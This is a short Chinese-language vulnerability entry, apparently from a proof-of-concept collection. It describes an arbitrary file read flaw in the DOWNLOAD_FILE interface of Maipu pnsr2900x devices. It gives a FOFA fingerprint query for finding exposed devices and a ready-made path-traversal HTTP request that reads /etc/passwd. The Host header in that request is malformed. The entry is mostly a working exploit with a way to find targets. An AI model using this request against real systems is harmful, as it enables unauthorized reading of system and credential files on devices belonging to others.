# 迈普pnsr2900x系统接口DOWNLOAD_FILE任意文件读取漏洞

迈普pnsr2900x系统接口DOWNLOAD_FILE任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。

## fofa

```javascript
body="/assets/css/ui-dialog.css"&& body="/form/formUserLogin"
```

## poc

```javascript
GET /DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Connection: keep-alive
```

![image-20241013140738432](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410131407485.png)